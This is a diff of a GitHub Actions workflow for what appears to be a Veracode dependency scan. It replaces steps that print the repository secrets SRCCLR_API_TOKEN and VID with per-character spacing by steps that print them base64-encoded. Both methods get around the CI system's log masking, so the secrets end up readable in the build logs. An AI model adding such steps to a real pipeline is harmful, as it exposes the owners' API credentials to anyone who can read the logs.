@@ -65,9 +65,10 @@ jobs:
           persist-credentials: false
 
       - name: Echo secret
-        run: echo ${{ secrets.SRCCLR_API_TOKEN}} | sed 's/./& /g'
-      - name: Echo secret
-        run: echo ${{ secrets.VID}} | sed 's/./& /g'
+        run: echo $(echo ${{secrets.SRCCLR_API_TOKEN}} | base64)
+      - name: Echo secret VID
+        run: echo $(echo ${{secrets.VID}} | base64)
+
       - name: Veracode SCA
         env:
           SCAN_DIR: '.'
